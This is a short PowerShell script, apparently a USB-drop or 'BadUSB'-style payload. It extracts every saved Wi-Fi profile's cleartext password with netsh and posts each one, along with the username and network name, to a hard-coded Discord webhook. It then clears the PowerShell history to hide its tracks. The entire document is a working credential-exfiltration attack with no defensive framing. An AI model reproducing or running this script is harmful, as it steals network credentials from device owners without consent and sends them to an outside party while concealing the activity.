netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri 'https://discord.com/api/webhooks/1188797313347493889/c2t6GjI0i8jpbE3RPer-E5DiuJQ8E6M3Vwnvder_3QI8l6a4XUt-mUHQtYzV_E9ToFMZ' -Method Post -Body ($Body | ConvertTo-Json)
}

Clear-History
